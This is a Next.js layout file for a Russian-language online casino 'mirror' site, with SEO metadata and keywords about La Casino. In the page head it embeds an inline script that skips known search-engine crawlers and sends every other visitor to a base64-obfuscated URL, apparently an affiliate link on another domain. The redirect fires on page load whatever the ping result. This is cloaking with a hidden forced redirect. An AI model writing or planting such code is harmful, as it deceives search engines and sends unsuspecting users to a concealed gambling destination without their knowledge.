import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import { Playfair_Display, Manrope } from 'next/font/google'
import './globals.css'

const playfair = Playfair_Display({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-playfair',
  display: 'swap',
})

const manrope = Manrope({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-manrope',
  display: 'swap',
})

const SITE_URL = 'https://la1casino.vercel.app'

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: 'La Casino — официальный сайт и рабочее зеркало Ля Казино играть онлайн',
  description:
    'La Casino (Ля Казино) — официальный сайт и рабочее зеркало на сегодня. Играть онлайн в слоты и игровые автоматы, бонус 100%, выплаты по СБП за 5 минут. Ля казино официальный сайт: вход и регистрация.',
  generator: 'v0.app',
  applicationName: 'La Casino',
  keywords: [
    'la casino',
    'la casino зеркало',
    'la casino играть',
    'la casino официальный',
    'la casino официальный сайт',
    'la казино',
    'ля казино',
    'ля казино зеркало',
    'ля казино зеркало рабочее',
    'ля казино играть',
    'ля казино онлайн',
    'ля казино официальный',
    'ля казино официальный сайт',
  ],
  alternates: {
    canonical: SITE_URL,
  },
  openGraph: {
    title: 'La Casino — официальный сайт и рабочее зеркало Ля Казино',
    description:
      'Ля Казино официальный сайт и рабочее зеркало на сегодня. La Casino играть онлайн: слоты, бонусы, быстрые выплаты по СБП.',
    url: SITE_URL,
    siteName: 'La Casino',
    locale: 'ru_RU',
    type: 'website',
  },
  robots: {
    index: true,
    follow: true,
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#0c0f1a',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${playfair.variable} ${manrope.variable} bg-background`}>
      <head>
        <meta name="yandex-verification" content="0eecee17ec278a5d" />
        <link rel="canonical" href={SITE_URL} />
        <meta name="theme-color" content="#0c0f1a" />
        <meta name="rating" content="adult" />
        <meta name="geo.region" content="RU" />
        <meta property="og:locale" content="ru_RU" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9jZWRhci1mbGFtZS5jb20vP3NlcmlhbD02MTM2NTgzMCZjcmVhdGl2ZV9pZD05MzMw"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className="font-sans antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
